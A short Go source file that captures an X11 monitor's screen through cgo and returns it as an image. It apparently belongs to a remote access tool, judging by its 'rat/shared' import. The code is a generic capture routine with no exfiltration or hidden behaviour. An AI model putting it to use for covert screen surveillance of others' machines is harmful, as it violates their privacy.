//+build !windows,!darwin

package screen

/*
#cgo LDFLAGS: -lX11
#include <stdlib.h>
#include "screen.h"
#include "screen_x11.h"
*/
import "C"

import (
	"image"
	"rat/shared"
	"unsafe"
)

func CaptureWindow(handle int) image.Image {
	panic("not implemented")
}

func Capture(monitor shared.Monitor) image.Image {
	m := cMonitor(monitor)

	image := C.CaptureMonitor(m)

	len := monitor.Width * monitor.Height * 4
	buf := C.GoBytes(unsafe.Pointer(image.data), C.int(len))

	defer C.DestroyImage(image)

	return imageFromBitmap(buf, monitor.Width, monitor.Height)
}
